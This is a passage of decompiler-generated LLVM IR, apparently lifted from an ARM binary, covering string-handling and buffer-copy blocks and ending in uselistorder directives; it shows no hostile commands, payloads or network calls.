  store i32 ptrtoint (i32* @global_var_1433c.107 to i32), i32* %r1.global-to-local, align 4
  %v2_a958 = add i32 %v2_a948, %v2_a950
  store i32 %v2_a958, i32* @r0, align 4
  %v2_a95c = inttoptr i32 %v2_a958 to i8*
  %v3_a95c = call i32 @function_139c4(i8* %v2_a95c, i32 ptrtoint (i32* @global_var_1433c.107 to i32))
  store i32 %v3_a95c, i32* %r0.global-to-local, align 4
  %v0_a960 = load i32, i32* %r6.global-to-local, align 4
  %v1_a960 = add i32 %v0_a960, 3
  store i32 %v1_a960, i32* @r4, align 4
  %v0_a964 = load i32, i32* @r8, align 4
  %v1_a964 = add i32 %v0_a964, 656
  %v2_a964 = inttoptr i32 %v1_a964 to i32*
  %v3_a964 = load i32, i32* %v2_a964, align 4
  %v0_a968 = load i32, i32* @r7, align 4
  %v2_a968 = add i32 %v0_a968, %v1_a960
  store i32 %v2_a968, i32* %r6.global-to-local, align 4
  %v2_a96c = sub i32 %v3_a964, %v1_a960
  store i32 %v2_a96c, i32* %r1.global-to-local, align 4
  %v0_a970 = load i32, i32* @sl, align 4
  store i32 %v0_a970, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_14338.105 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_a968, i32* %r0.global-to-local, align 4
  %v4_a97c = call i32 @function_13a60(i32 %v2_a968, i32 %v2_a96c, i32 ptrtoint (i32* @global_var_14338.105 to i32), i32 %v0_a970)
  store i32 %v4_a97c, i32* %r0.global-to-local, align 4
  %v0_a980 = load i32, i32* @r8, align 4
  %v1_a980 = add i32 %v0_a980, 12
  %v2_a980 = inttoptr i32 %v1_a980 to i32*
  %v3_a980 = load i32, i32* %v2_a980, align 4
  store i32 %v1_a168, i32* %ip.global-to-local, align 4
  %v1_a988 = and i32 %v3_a980, 33554432
  %v2_a988 = icmp ne i32 %v1_a988, 0
  store i1 %v2_a988, i1* %cpsr_c.global-to-local, align 1
  %v3_a988 = mul i32 %v3_a980, 128
  %v0_a98c = load i32, i32* @r4, align 4
  %v1_a98c = load i32, i32* %sb.global-to-local, align 4
  %v2_a990 = add i32 %v3_a988, %v1_a168
  store i32 %v2_a990, i32* @r5, align 4
  %v2_a98c = add i32 %v0_a98c, %v4_a97c
  %v2_a994 = add i32 %v2_a98c, %v1_a98c
  store i32 %v2_a994, i32* @r4, align 4
  %v0_a998 = load i32, i32* %fp.global-to-local, align 4
  %v1_a998 = trunc i32 %v0_a998 to i8
  %v3_a998 = add i32 %v2_a994, 2115
  %v4_a998 = inttoptr i32 %v3_a998 to i8*
  store i8 %v1_a998, i8* %v4_a998, align 1
  %v0_a99c = load i32, i32* @r5, align 4
  store i32 %v0_a99c, i32* %r0.global-to-local, align 4
  %v1_a9a0 = inttoptr i32 %v0_a99c to i8*
  %v2_a9a0 = call i32 @function_1399c(i8* %v1_a9a0)
  %v0_a9a4 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_a9a4, i32* %r1.global-to-local, align 4
  %v0_a9a8 = load i32, i32* @r5, align 4
  %v2_a9a8 = add i32 %v0_a9a8, %v2_a9a0
  store i32 %v2_a9a8, i32* @r0, align 4
  %v2_a9ac = inttoptr i32 %v2_a9a8 to i8*
  %v3_a9ac = call i32 @function_139c4(i8* %v2_a9ac, i32 %v0_a9a4)
  store i32 %v3_a9ac, i32* %r0.global-to-local, align 4
  %v0_a9b0 = load i32, i32* @r8, align 4
  %v1_a9b0 = add i32 %v0_a9b0, 12
  %v2_a9b0 = inttoptr i32 %v1_a9b0 to i32*
  %v3_a9b0 = load i32, i32* %v2_a9b0, align 4
  %v1_a9b4 = add i32 %v3_a9b0, 1
  store i32 %v1_a9b4, i32* %r3.global-to-local, align 4
  store i32 %v1_a9b4, i32* %v2_a9b0, align 4
  br label %dec_label_pc_a88c

dec_label_pc_a9c0:                                ; preds = %dec_label_pc_a5a4
  store i32 7, i32* %ip.global-to-local, align 4
  store i32 %v10_9048, i32* %r1.global-to-local, align 4
  store i32 7, i32* %stack_var_-40, align 4
  %v0_a9cc = load i32, i32* @r5, align 4
  %v1_a9cc = add i32 %v0_a9cc, 4
  %v2_a9cc = inttoptr i32 %v1_a9cc to i8*
  %v3_a9cc = load i8, i8* %v2_a9cc, align 1
  %v4_a9cc = zext i8 %v3_a9cc to i32
  store i32 %v4_a9cc, i32* %r3.global-to-local, align 4
  %v2_a9d0 = icmp ugt i8 %v3_a9cc, 114
  store i1 %v2_a9d0, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_a9d0 = icmp ult i8 %v3_a9cc, 115
  store i1 %v6_a9d0, i1* %cpsr_n.global-to-local, align 1
  %v7_a9d0 = icmp eq i8 %v3_a9cc, 115
  store i1 %v7_a9d0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a9d0, label %bb247, label %.thread70

bb247:                                            ; preds = %dec_label_pc_a9c0
  store i32 8, i32* %ip.global-to-local, align 4
  store i32 8, i32* %stack_var_-40, align 4
  br label %.thread70

.thread70:                                        ; preds = %dec_label_pc_a9c0, %bb247
  %v3_a9e0 = phi i32 [ 7, %dec_label_pc_a9c0 ], [ 8, %bb247 ]
  %v0_a9e4 = load i32, i32* @r7, align 4
  %v1_a9e4 = sub nsw i32 1, %v3_a9e0
  %v2_a9e8 = add i32 %v1_a9e4, %v0_a9e4
  store i32 %v2_a9e8, i32* %r2.global-to-local, align 4
  store i32 %v0_a9cc, i32* %r0.global-to-local, align 4
  %v2_a9f0 = add i32 %v3_a9e0, %v0_a9cc
  store i32 %v2_a9f0, i32* %r1.global-to-local, align 4
  %v3_a9f4 = call i32 @_memmove(i32 %v0_a9cc, i32 %v2_a9f0, i32 %v2_a9e8)
  store i32 %v3_a9f4, i32* %r0.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  store i32 %v10_9048, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-40, align 4
  %v0_aa04 = load i32, i32* @r6, align 4
  %v1_aa04 = load i32, i32* @r4, align 4
  %v2_aa04 = add i32 %v1_aa04, %v0_aa04
  %v3_aa04 = inttoptr i32 %v2_aa04 to i8*
  %v4_aa04 = load i8, i8* %v3_aa04, align 1
  %v6_aa04 = zext i8 %v4_aa04 to i32
  store i32 %v6_aa04, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v9_aa08 = icmp eq i8 %v4_aa04, 0
  store i1 %v9_aa08, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_aa08, label %dec_label_pc_aa48, label %dec_label_pc_aa10

dec_label_pc_aa10:                                ; preds = %.thread70
  %v2_aa10 = icmp ugt i8 %v4_aa04, 46
  store i1 %v2_aa10, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_aa10 = icmp ult i8 %v4_aa04, 47
  store i1 %v6_aa10, i1* %cpsr_n.global-to-local, align 1
  %v7_aa10 = icmp eq i8 %v4_aa04, 47
  store i1 %v7_aa10, i1* %cpsr_z.global-to-local, align 1
  %v1_aa14 = load i32, i32* @r5, align 4
  br i1 %v7_aa10, label %bb248, label %dec_label_pc_aa1c

bb248:                                            ; preds = %dec_label_pc_aa10
  store i32 %v1_aa14, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_ab2c

dec_label_pc_aa1c:                                ; preds = %dec_label_pc_aa10
  store i32 1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_aa2c

dec_label_pc_aa24:                                ; preds = %dec_label_pc_aa2c
  %v2_aa24 = icmp ugt i8 %v4_aa34, 46
  store i1 %v2_aa24, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_aa24 = icmp ult i8 %v4_aa34, 47
  store i1 %v6_aa24, i1* %cpsr_n.global-to-local, align 1
  %v7_aa24 = icmp eq i8 %v4_aa34, 47
  store i1 %v7_aa24, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_aa24, label %dec_label_pc_ab2c, label %dec_label_pc_aa2c

dec_label_pc_aa2c:                                ; preds = %dec_label_pc_aa24, %dec_label_pc_aa1c
  %v1_aa3c = phi i32 [ %v1_aa40, %dec_label_pc_aa24 ], [ 1, %dec_label_pc_aa1c ]
  store i32 %v10_9048, i32* %lr.global-to-local, align 4
  store i32 %v1_aa3c, i32* %stack_var_-40, align 4
  %v2_aa34 = add i32 %v1_aa3c, %v1_aa14
  %v3_aa34 = inttoptr i32 %v2_aa34 to i8*
  %v4_aa34 = load i8, i8* %v3_aa34, align 1
  %v6_aa34 = zext i8 %v4_aa34 to i32
  store i32 %v6_aa34, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_aa38 = icmp eq i8 %v4_aa34, 0
  store i1 %v2_aa38, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_aa34, i32* %r1.global-to-local, align 4
  %v1_aa40 = add i32 %v1_aa3c, 1
  store i32 %v1_aa40, i32* %r3.global-to-local, align 4
  br i1 %v2_aa38, label %dec_label_pc_aa48, label %dec_label_pc_aa24

dec_label_pc_aa48:                                ; preds = %dec_label_pc_aa2c, %.thread70, %dec_label_pc_ab2c
  %v0_aa48 = load i32, i32* @r5, align 4
  store i32 %v0_aa48, i32* %r0.global-to-local, align 4
  %v1_aa4c = inttoptr i32 %v0_aa48 to i8*
  %v2_aa4c = call i32 @function_1399c(i8* %v1_aa4c)
  store i32 %v2_aa4c, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_aa50 = icmp slt i32 %v2_aa4c, 0
  store i1 %v1_aa50, i1* %cpsr_n.global-to-local, align 1
  %v2_aa50 = icmp eq i32 %v2_aa4c, 0
  store i1 %v2_aa50, i1* %cpsr_z.global-to-local, align 1
  %tmp249 = icmp slt i32 %v2_aa4c, 1
  br i1 %tmp249, label %dec_label_pc_aa74, label %dec_label_pc_aa58

dec_label_pc_aa58:                                ; preds = %dec_label_pc_aa48
  %v0_aa58 = load i32, i32* @r5, align 4
  store i32 %v0_aa58, i32* %r0.global-to-local, align 4
  %v1_aa5c = inttoptr i32 %v0_aa58 to i8*
  %v2_aa5c = call i32 @function_1399c(i8* %v1_aa5c)
  store i32 %v2_aa5c, i32* %r0.global-to-local, align 4
  %v1_aa60 = add i32 %v2_aa5c, -127
  %v2_aa60 = icmp ugt i32 %v2_aa5c, 126
  store i1 %v2_aa60, i1* %cpsr_c.global-to-local, align 1
  %v3_aa60 = sub i32 126, %v2_aa5c
  %v4_aa60 = and i32 %v3_aa60, %v2_aa5c
  %v5_aa60 = icmp slt i32 %v4_aa60, 0
  store i1 %v5_aa60, i1* %cpsr_v.global-to-local, align 1
  %v6_aa60 = icmp slt i32 %v1_aa60, 0
  store i1 %v6_aa60, i1* %cpsr_n.global-to-local, align 1
  %v7_aa60 = icmp eq i32 %v2_aa5c, 127
  store i1 %v7_aa60, i1* %cpsr_z.global-to-local, align 1
  %v7_aa64 = icmp sgt i32 %v2_aa5c, 127
  br i1 %v7_aa64, label %.thread73, label %bb250

bb250:                                            ; preds = %dec_label_pc_aa58
  %v8_aa64 = load i32, i32* %sb.global-to-local, align 4
  %v9_aa68 = add i32 %v8_aa64, 789
  store i32 %v9_aa68, i32* %r0.global-to-local, align 4
  %v8_aa6c = load i32, i32* @r5, align 4
  store i32 %v8_aa6c, i32* %r1.global-to-local, align 4
  br label %.thread73

.thread73:                                        ; preds = %dec_label_pc_aa58, %bb250
  store i32 43636, i32* %lr.global-to-local, align 4
  %v3_aa70 = xor i1 %v6_aa60, %v5_aa60
  %v4_aa70 = or i1 %v7_aa60, %v3_aa70
  call void @__pseudo_cond_branch(i1 %v4_aa70, i32 ptrtoint (i32* @global_var_139c4.103 to i32))
  br label %dec_label_pc_aa74

dec_label_pc_aa74:                                ; preds = %dec_label_pc_aa48, %.thread73
  store i32 %v10_9048, i32* %r1.global-to-local, align 4
  %v3_aa78 = load i32, i32* %stack_var_-40, align 4
  %v0_aa7c = load i32, i32* @r5, align 4
  %v2_aa7c = add i32 %v3_aa78, 1
  %v1_aa80 = add i32 %v2_aa7c, %v0_aa7c
  store i32 %v1_aa80, i32* %r0.global-to-local, align 4
  %v1_aa84 = inttoptr i32 %v1_aa80 to i8*
  %v2_aa84 = call i32 @function_1399c(i8* %v1_aa84)
  store i32 %v2_aa84, i32* %r0.global-to-local, align 4
  %v1_aa88 = add i32 %v2_aa84, -255
  %v2_aa88 = icmp ugt i32 %v2_aa84, 254
  store i1 %v2_aa88, i1* %cpsr_c.global-to-local, align 1
  %v3_aa88 = sub i32 254, %v2_aa84
  %v4_aa88 = and i32 %v3_aa88, %v2_aa84
  %v5_aa88 = icmp slt i32 %v4_aa88, 0
  store i1 %v5_aa88, i1* %cpsr_v.global-to-local, align 1
  %v6_aa88 = icmp slt i32 %v1_aa88, 0
  store i1 %v6_aa88, i1* %cpsr_n.global-to-local, align 1
  %v7_aa88 = icmp eq i32 %v2_aa84, 255
  store i1 %v7_aa88, i1* %cpsr_z.global-to-local, align 1
  %v8_aa8c = icmp sgt i32 %v2_aa84, 255
  br i1 %v8_aa8c, label %dec_label_pc_a5dc, label %dec_label_pc_aa90

dec_label_pc_aa90:                                ; preds = %dec_label_pc_aa74
  %v0_aa90 = load i32, i32* %sb.global-to-local, align 4
  %v1_aa94 = add i32 %v0_aa90, 533
  store i32 %v1_aa94, i32* @r4, align 4
  store i32 %v1_aa94, i32* %r0.global-to-local, align 4
  store i32 255, i32* %r1.global-to-local, align 4
  %v2_aaa0 = call i32 @function_13a3c(i32 %v1_aa94, i32 255)
  store i32 %v10_9048, i32* %r2.global-to-local, align 4
  %v3_aaa8 = load i32, i32* %stack_var_-40, align 4
  %v0_aaac = load i32, i32* @r5, align 4
  %v2_aaac = add i32 %v3_aaa8, 1
  %v1_aab0 = add i32 %v2_aaac, %v0_aaac
  store i32 %v1_aab0, i32* %r0.global-to-local, align 4
  %v1_aab4 = inttoptr i32 %v1_aab0 to i8*
  %v2_aab4 = call i32 @function_1399c(i8* %v1_aab4)
  store i32 %v2_aab4, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_aab8 = icmp slt i32 %v2_aab4, 0
  store i1 %v1_aab8, i1* %cpsr_n.global-to-local, align 1
  %v2_aab8 = icmp eq i32 %v2_aab4, 0
  store i1 %v2_aab8, i1* %cpsr_z.global-to-local, align 1
  %tmp251 = icmp slt i32 %v2_aab4, 1
  br i1 %tmp251, label %dec_label_pc_a5dc, label %dec_label_pc_aac0

dec_label_pc_aac0:                                ; preds = %dec_label_pc_aa90
  store i32 %v10_9048, i32* %r3.global-to-local, align 4
  %v3_aac4 = load i32, i32* %stack_var_-40, align 4
  %v0_aac8 = load i32, i32* @r5, align 4
  %v0_aacc = load i32, i32* @r4, align 4
  store i32 %v0_aacc, i32* @r0, align 4
  %v2_aac8 = add i32 %v3_aac4, 1
  %v1_aad0 = add i32 %v2_aac8, %v0_aac8
  store i32 %v1_aad0, i32* %r1.global-to-local, align 4
  %v2_aad4 = inttoptr i32 %v0_aacc to i8*
  %v3_aad4 = call i32 @function_139c4(i8* %v2_aad4, i32 %v1_aad0)
  store i32 %v3_aad4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_a5dc

dec_label_pc_aadc:                                ; preds = %dec_label_pc_a344
  %v0_aadc = load i32, i32* @r4, align 4
  %v1_aadc = trunc i32 %v0_aadc to i8
  %v2_aadc = load i32, i32* @r8, align 4
  %v3_aadc = add i32 %v2_aadc, -1452
  %v4_aadc = inttoptr i32 %v3_aadc to i8*
  store i8 %v1_aadc, i8* %v4_aadc, align 1
  br label %dec_label_pc_9590

dec_label_pc_aae4:                                ; preds = %dec_label_pc_a55c
  %v1_aae4 = add i32 %v0_aae4, 1
  store i32 %v1_aae4, i32* %ip.global-to-local, align 4
  %v2_aae8 = add i32 %v0_a55c, %v1_aae4
  store i32 %v2_aae8, i32* %r4.global-to-local, align 4
  store i32 %v10_9048, i32* %r2.global-to-local, align 4
  store i32 %v2_aae8, i32* %r0.global-to-local, align 4
  store i32 %v1_aae4, i32* %stack_var_-40, align 4
  %v1_aaf8 = inttoptr i32 %v2_aae8 to i8*
  %v2_aaf8 = call i32 @function_1399c(i8* %v1_aaf8)
  store i32 %v2_aaf8, i32* %r0.global-to-local, align 4
  %v0_aafc = load i32, i32* %r4.global-to-local, align 4
  %v2_aafc = add i32 %v0_aafc, %v2_aaf8
  %v1_ab00 = add i32 %v2_aafc, -1
  %v2_ab00 = inttoptr i32 %v1_ab00 to i8*
  %v3_ab00 = load i8, i8* %v2_ab00, align 1
  %v4_ab00 = zext i8 %v3_ab00 to i32
  store i32 %v4_ab00, i32* %r3.global-to-local, align 4
  %v2_ab04 = icmp ugt i8 %v3_ab00, 33
  store i1 %v2_ab04, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_ab04 = icmp ult i8 %v3_ab00, 34
  store i1 %v6_ab04, i1* %cpsr_n.global-to-local, align 1
  %v7_ab04 = icmp eq i8 %v3_ab00, 34
  store i1 %v7_ab04, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ab04, label %dec_label_pc_ab0c, label %dec_label_pc_a568

dec_label_pc_ab0c:                                ; preds = %dec_label_pc_aae4
  store i32 %v10_9048, i32* %r3.global-to-local, align 4
  %v3_ab10 = load i32, i32* %stack_var_-40, align 4
  %v0_ab14 = load i32, i32* @r6, align 4
  %v2_ab14 = add i32 %v0_ab14, %v3_ab10
  store i32 %v2_ab14, i32* %r4.global-to-local, align 4
  store i32 %v2_ab14, i32* %r0.global-to-local, align 4
  %v1_ab1c = inttoptr i32 %v2_ab14 to i8*
  %v2_ab1c = call i32 @function_1399c(i8* %v1_ab1c)
  store i32 %v2_ab1c, i32* %r0.global-to-local, align 4
  %v2_ab20 = add i32 %v2_ab14, %v2_ab1c
  %v0_ab24 = load i32, i32* @r5, align 4
  %v1_ab24 = trunc i32 %v0_ab24 to i8
  %v3_ab24 = add i32 %v2_ab20, -1
  %v4_ab24 = inttoptr i32 %v3_ab24 to i8*
  store i8 %v1_ab24, i8* %v4_ab24, align 1
  br label %dec_label_pc_a568

dec_label_pc_ab2c:                                ; preds = %dec_label_pc_aa24, %bb248
  %v2_ab30 = phi i32 [ %v1_aa14, %bb248 ], [ %v2_aa34, %dec_label_pc_aa24 ]
  store i32 0, i32* %ip.global-to-local, align 4
  %v3_ab30 = inttoptr i32 %v2_ab30 to i8*
  store i8 0, i8* %v3_ab30, align 1
  br label %dec_label_pc_aa48

dec_label_pc_ab38:                                ; preds = %dec_label_pc_a5d0
  store i32 %v10_9048, i32* %ip.global-to-local, align 4
  %v3_ab3c = load i32, i32* %stack_var_-40, align 4
  %v0_ab40 = load i32, i32* @r5, align 4
  %v2_ab40 = add i32 %v3_ab3c, 1
  %v1_ab44 = add i32 %v2_ab40, %v0_ab40
  store i32 %v1_ab44, i32* %r0.global-to-local, align 4
  %v1_ab48 = inttoptr i32 %v1_ab44 to i8*
  %v2_ab48 = call i32 @function_1399c(i8* %v1_ab48)
  store i32 %v2_ab48, i32* %r0.global-to-local, align 4
  %v1_ab4c = add i32 %v2_ab48, -255
  %v2_ab4c = icmp ugt i32 %v2_ab48, 254
  store i1 %v2_ab4c, i1* %cpsr_c.global-to-local, align 1
  %v3_ab4c = sub i32 254, %v2_ab48
  %v4_ab4c = and i32 %v3_ab4c, %v2_ab48
  %v5_ab4c = icmp slt i32 %v4_ab4c, 0
  store i1 %v5_ab4c, i1* %cpsr_v.global-to-local, align 1
  %v6_ab4c = icmp slt i32 %v1_ab4c, 0
  store i1 %v6_ab4c, i1* %cpsr_n.global-to-local, align 1
  %v7_ab4c = icmp eq i32 %v2_ab48, 255
  store i1 %v7_ab4c, i1* %cpsr_z.global-to-local, align 1
  %v8_ab50 = icmp sgt i32 %v2_ab48, 255
  br i1 %v8_ab50, label %dec_label_pc_a5dc, label %dec_label_pc_ab54

dec_label_pc_ab54:                                ; preds = %dec_label_pc_ab38
  %v0_ab54 = load i32, i32* %sb.global-to-local, align 4
  %v1_ab58 = add i32 %v0_ab54, 533
  store i32 %v1_ab58, i32* @r4, align 4
  store i32 %v1_ab58, i32* %r0.global-to-local, align 4
  store i32 255, i32* %r1.global-to-local, align 4
  %v2_ab64 = call i32 @function_13a3c(i32 %v1_ab58, i32 255)
  store i32 %v10_9048, i32* %lr.global-to-local, align 4
  %v3_ab6c = load i32, i32* %stack_var_-40, align 4
  %v0_ab70 = load i32, i32* @r5, align 4
  %v2_ab70 = add i32 %v3_ab6c, 1
  %v1_ab74 = add i32 %v2_ab70, %v0_ab70
  store i32 %v1_ab74, i32* %r0.global-to-local, align 4
  %v1_ab78 = inttoptr i32 %v1_ab74 to i8*
  %v2_ab78 = call i32 @function_1399c(i8* %v1_ab78)
  store i32 %v2_ab78, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_ab7c = icmp slt i32 %v2_ab78, 0
  store i1 %v1_ab7c, i1* %cpsr_n.global-to-local, align 1
  %v2_ab7c = icmp eq i32 %v2_ab78, 0
  store i1 %v2_ab7c, i1* %cpsr_z.global-to-local, align 1
  %tmp252 = icmp slt i32 %v2_ab78, 1
  br i1 %tmp252, label %dec_label_pc_a5dc, label %dec_label_pc_ab84

dec_label_pc_ab84:                                ; preds = %dec_label_pc_ab54
  store i32 %v10_9048, i32* %r2.global-to-local, align 4
  %v3_ab88 = load i32, i32* %stack_var_-40, align 4
  %v0_ab8c = load i32, i32* @r5, align 4
  %v0_ab90 = load i32, i32* @r4, align 4
  store i32 %v0_ab90, i32* @r0, align 4
  %v2_ab8c = add i32 %v3_ab88, 1
  %v1_ab94 = add i32 %v2_ab8c, %v0_ab8c
  store i32 %v1_ab94, i32* %r1.global-to-local, align 4
  %v2_ab98 = inttoptr i32 %v0_ab90 to i8*
  %v3_ab98 = call i32 @function_139c4(i8* %v2_ab98, i32 %v1_ab94)
  store i32 %v3_ab98, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_a5dc

dec_label_pc_abc8:                                ; preds = %dec_label_pc_919c, %dec_label_pc_91d4
  %v0_9220 = call i32 @function_10b68()
  store i32 5, i32* %r1.global-to-local, align 4
  %v2_9228 = urem i32 %v0_9220, 5
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_922c = icmp ult i32 %v2_9228, 4
  store i1 %v6_922c, i1* %cpsr_n.global-to-local, align 1
  %v7_922c = icmp eq i32 %v2_9228, 4
  store i1 %v7_922c, i1* %cpsr_z.global-to-local, align 1
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  store i32 47, i32* %r0.global-to-local, align 4
  %v1_ac30 = call i32 @function_13074(i32 47)
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 47, i32* %r0.global-to-local, align 4
  %v3_ac3c = call i32 @function_12f90(i32 47, i32* null)
  store i32 %v3_ac3c, i32* %r1.global-to-local, align 4
  %v0_ac44 = load i32, i32* @r5, align 4
  %v1_ac44 = add i32 %v0_ac44, 20
  store i32 %v1_ac44, i32* @r0, align 4
  %v2_ac48 = inttoptr i32 %v1_ac44 to i8*
  %v3_ac48 = call i32 @function_139c4(i8* %v2_ac48, i32 %v3_ac3c)
  store i32 47, i32* %r0.global-to-local, align 4
  %v1_ac50 = call i32 @function_12fbc(i32 47)
  %v0_abc8 = load i32, i32* @sl, align 4
  store i32 %v0_abc8, i32* %r1.global-to-local, align 4
  store i32 %v0_9164, i32* @r0, align 4
  %v2_abd0 = inttoptr i32 %v0_9164 to i8*
  %v3_abd0 = call i32 @function_139c4(i8* %v2_abd0, i32 %v0_abc8)
  store i32 %v3_abd0, i32* %r0.global-to-local, align 4
  store i32 %v0_90f4, i32* %r1.global-to-local, align 4
  %v0_abd8 = load i32, i32* @r7, align 4
  %v1_abd8 = add i32 %v0_abd8, 1
  store i32 %v1_abd8, i32* @r7, align 4
  %v0_abdc = load i32, i32* @r5, align 4
  %v2_abe0 = sub i32 %v0_90f4, %v1_abd8
  %v3_abe0 = icmp uge i32 %v0_90f4, %v1_abd8
  store i1 %v3_abe0, i1* %cpsr_c.global-to-local, align 1
  %v4_abe0 = xor i32 %v1_abd8, %v0_90f4
  %v5_abe0 = xor i32 %v2_abe0, %v0_90f4
  %v6_abe0 = and i32 %v5_abe0, %v4_abe0
  %v7_abe0 = icmp slt i32 %v6_abe0, 0
  store i1 %v7_abe0, i1* %cpsr_v.global-to-local, align 1
  %v8_abe0 = icmp slt i32 %v2_abe0, 0
  store i1 %v8_abe0, i1* %cpsr_n.global-to-local, align 1
  %v9_abe0 = icmp eq i32 %v0_90f4, %v1_abd8
  store i1 %v9_abe0, i1* %cpsr_z.global-to-local, align 1
  %v1_abe4 = add i32 %v0_abdc, 3140
  store i32 %v1_abe4, i32* @r5, align 4
  br i1 %v9_abe0, label %dec_label_pc_abec, label %dec_label_pc_9124

dec_label_pc_abec:                                ; preds = %dec_label_pc_abc8
  %v1_abf8 = add i32 %v3_9108, 1456
  %v0_ac00 = load i32, i32* %r8.global-to-local, align 4
  %v1_ac00 = urem i32 %v0_ac00, 256
  store i32 %v1_ac00, i32* %ip.global-to-local, align 4
  %v1_ac04 = add i32 %v3_9108, 1464
  store i32 %v1_ac04, i32* %r2.global-to-local, align 4
  %v2_ac08 = ptrtoint i32* %stack_var_-10568 to i32
  store i32 %v2_ac08, i32* %r3.global-to-local, align 4
  store i32 %v1_abf8, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_9280.preheader

; uselistorder directives
  uselistorder i32 %v2_ac08, { 1, 0 }
  uselistorder i32 %v1_ac04, { 1, 0 }
  uselistorder i32 %v1_abf8, { 1, 0 }
  uselistorder i32 %v1_abe4, { 1, 0 }
  uselistorder i32 %v2_abe0, { 1, 0 }
  uselistorder i32 %v1_abd8, { 2, 0, 3, 1, 4 }
  uselistorder i32 %v2_9228, { 1, 0 }
  uselistorder i32 %v2_ab48, { 1, 2, 0, 5, 4, 3, 6 }
  uselistorder i32 %v1_aae4, { 1, 0, 2 }
  uselistorder i32 %v2_aa84, { 1, 2, 0, 5, 4, 3, 6 }
  uselistorder i32 %v2_aa5c, { 1, 2, 0, 5, 4, 3, 6 }
  uselistorder i32 %v1_aa40, { 1, 0 }
  uselistorder i8 %v4_aa34, { 3, 4, 2, 1, 0 }
  uselistorder i32 %v1_aa3c, { 1, 0, 2 }
  uselistorder i1 %v7_aa24, { 1, 0 }
  uselistorder i32 %v1_aa14, { 1, 0, 2 }
  uselistorder i1 %v7_aa10, { 1, 0 }
  uselistorder i1 %v9_aa08, { 1, 0 }
  uselistorder i32 %v2_a9e8, { 1, 0 }
  uselistorder i32 %v0_a9cc, { 2, 0, 1, 3 }
  uselistorder i32 %v2_a968, { 1, 0, 2 }
  uselistorder i32 %v1_a960, { 1, 0, 2 }
  uselistorder i32 %v2_a918, { 1, 2, 0, 5, 4, 3, 6 }
  uselistorder i32 %v2_a8ec, { 1, 2, 0, 5, 4, 3, 6 }
  uselistorder i32 %v3_a870, { 5, 1, 0, 4, 3, 2, 6 }
  uselistorder i32 %v2_a854, { 1, 0, 2 }
  uselistorder i32 %v4_a84c, { 2, 1, 0, 3 }
  uselistorder i32 %v2_a814, { 1, 0 }
  uselistorder i32 %v1_a814, { 1, 3, 0, 2, 4 }
  uselistorder i32 %v0_a814, { 2, 4, 0, 1, 3, 5 }
  uselistorder i32 %v2_a77c, { 1, 2, 0, 5, 4, 3, 6 }
  uselistorder i32 %v2_a754, { 1, 2, 0, 5, 4, 3, 6 }
  uselistorder i32 %v1_a734, { 1, 0 }
  uselistorder i8 %v4_a72c, { 3, 4, 2, 1, 0 }
  uselistorder i32 %v0_a734, { 1, 0, 3, 2 }
  uselistorder i1 %v7_a718, { 1, 0 }
  uselistorder i32 %v1_a708, { 1, 0, 2 }
  uselistorder i1 %v7_a704, { 1, 0 }
  uselistorder i32 %v0_a6c4, { 2, 0, 1, 3 }
  uselistorder i32 %v2_a6a8, { 1, 0, 4, 3, 2, 5 }
  uselistorder i32 %v5_a5c4, { 1, 0, 4, 3, 2, 5 }
  uselistorder i32 %v2_a598, { 1, 0 }
  uselistorder i32 %v1_a598, { 2, 0, 1, 3 }
  uselistorder i32 %v2_a594, { 3, 0, 1, 4, 2 }
  uselistorder i32 %v1_a574, { 0, 2, 1, 3 }
  uselistorder i32 %v0_a55c, { 1, 0 }
  uselistorder i32 %v0_aae4, { 1, 0 }
  uselistorder i32 %v1_a518, { 1, 2, 0 }
  uselistorder i32 %v5_a514, { 0, 2, 1, 3 }
  uselistorder i32 %v0_a500, { 1, 0 }
  uselistorder i32 %v2_a4f4, { 1, 0, 2 }
  uselistorder i32 %v1_a4b8, { 0, 2, 1 }
  uselistorder i32 %v1_a4a8, { 1, 0, 3, 4, 2 }
  uselistorder i32 %v1_a494, { 0, 2, 1, 3 }
  uselistorder i32 %v1_a450, { 1, 2, 0 }
  uselistorder i32 %v4_a44c, { 1, 3, 2, 5, 8, 9, 7, 6, 4, 0, 11, 10, 12 }
  uselistorder i32 %v2_a434.v4_a414, { 1, 0, 2 }
  uselistorder i32 %v1_a3f0, { 1, 2, 0 }
